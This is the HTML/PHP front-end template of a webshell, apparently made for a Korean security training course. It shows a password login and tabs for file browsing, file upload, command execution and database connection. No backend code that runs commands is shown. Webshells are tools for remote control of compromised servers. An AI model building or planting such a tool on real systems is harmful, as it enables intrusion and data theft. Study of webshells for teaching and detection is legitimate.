<!DOCTYPE html>
<html lang="ko">
<head>
    <title>2022_산대특 Webshell</title>
    <!-- 합쳐지고 최소화된 최신 CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <!-- 부가적인 테마 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <!-- 합쳐지고 최소화된 최신 자바스크립트 -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    
</head>
<body>
<div class="container-fluid">
    <div class="row">
    <div class="col-md-3"></div>
    <div class="col-md-6">
            <h3>Login</h3>
            <hr>
            <form action="<?=$page?>?mode=login" method="POST">
            <div class="input-group">
            <span class="input-group-addon">Password</span>
            <input type="password" class="form-control" placeholder="Password Input..." name="inputPw">
            </div>
            <br>
            <p class="text-center"><button class="btn btn-default" type="submit">Auth</button></a>
            </form>
        <h3>Webshell <small>Create by 2022_산대특</small></h3>
        <hr>
        <ul class="nav nav-tabs">
        <li role="presentation" <?php if(empty($mode) || $mode == "fileBrowser") echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
        <li role="presentation" <?php if($mode == "fileUpload") echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileUpload&path=<?=$path?>">File Upload</a></li>
        <li role="presentation" <?php if($mode == "command") echo "class=\"active\"";?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
        <li role="presentation" <?php if($mode == "db") echo "class=\"active\"";?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
        <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
        </ul>
        <br>
        <form action="<?=$page?>?mode=fileBrowser" metho="GET">
            <div class="input-group">
            <span class="input-group-addon">Current Path</span>
            <input type="text" class="form-control" placeholder="Path Input..." name="path" value="<?=$path?>">
            <span class="input-group-btn">
            <button class="btn btn-default" type="submit">Move</button>
            </span>
            </div>
        </form>
        <hr>
        <div class="table-responsive">
        <table class="table table-bordered table-hover"style="table-layout: fixed; word-break: break-all;">
            <thead>
                <tr class="active">
                    <th style="width: 50%" class="text-center">Name</th>
                    <th style="width: 14%" class="text-center">Type</th>
                    <th style="width: 18%" class="text-center">Date</th>
                    <th style="width: 18%" class="text-center">Action</th>
                </tr>
            </thead>
            <tbody>
      </tbody>
   </table>
</body>
</html>